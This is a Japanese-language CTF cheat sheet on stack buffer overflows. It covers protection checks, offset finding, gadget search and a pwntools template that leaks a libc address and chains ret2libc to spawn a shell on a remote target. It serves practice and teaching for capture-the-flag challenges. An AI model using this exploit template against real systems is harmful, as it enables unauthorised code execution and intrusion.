# Buffer Overflow (CTF Jeopardy)

## Jeopardy典型パターン

| 保護機構 | 難易度 | 攻撃手法 |
|---------|--------|---------|
| NX無効 | Easy | シェルコード直接実行 |
| NX有効, PIE無効 | Medium | ret2plt, ROP |
| NX+PIE有効 | Hard | Leak→ret2libc |
| Canary有効 | Hard | Canary leak or bypass |

## Skill
- アーキ/ABI：x86_64 SysV / x86 / ARM の呼出規約を即適用
- 保護機構：NX/PIE/Canary/RELRO/ASLR を見て方針決定
- Leak→ret2libc/ROP→安定化（remote差分に強い）
- 入力経路：argv/stdin/socket、改行/NULL/長さ制限の扱い最適化

## Jeopardy Workflow
```
1. checksec: 保護機構確認
2. 動的解析: crash→offset特定
3. リーク: puts(got)/printf leak
4. ROP構築: system("/bin/sh") or one_gadget
5. flag: cat flag.txt
```

## Quick Commands
```bash
# 保護機構確認
checksec ./binary

# オフセット特定
python3 -c "from pwn import *; print(cyclic(200))"
# → crashしたアドレスから
python3 -c "from pwn import *; print(cyclic_find(0x61616167))"

# gadget探索
ROPgadget --binary ./binary | grep "pop rdi"

# libc one_gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

## pwntools Template
```python
from pwn import *

context.binary = elf = ELF('./binary')
# libc = ELF('./libc.so.6')

# r = process('./binary')
r = remote('host', port)

# 1. オフセット確認済み
offset = 40

# 2. Leak (例: puts@GOT)
payload = b'A' * offset
payload += p64(elf.plt['puts'])  # puts呼び出し
payload += p64(elf.got['puts'])  # 引数 = puts@GOT
payload += p64(elf.symbols['main'])  # 戻り先

r.sendline(payload)
leak = u64(r.recvline().strip().ljust(8, b'\x00'))
log.info(f"puts leak: {hex(leak)}")

# 3. libc base計算
# libc_base = leak - libc.symbols['puts']
# system = libc_base + libc.symbols['system']
# bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# 4. Final payload
# payload2 = b'A' * offset + p64(pop_rdi) + p64(bin_sh) + p64(system)

r.interactive()
```

## Quick Checklist
1. crash制御（RIP/EIP）→offset確定
2. leak可能性（puts/printf/format/partial read）
3. GOT/PLT/one_gadget/stack pivot の候補列挙
4. **リモートとローカルのlibc差異に注意**

## Tools
- pwntools, gdb + pwndbg/gef, checksec
- ROPgadget, one_gadget
- libc-database: https://libc.blukat.me/
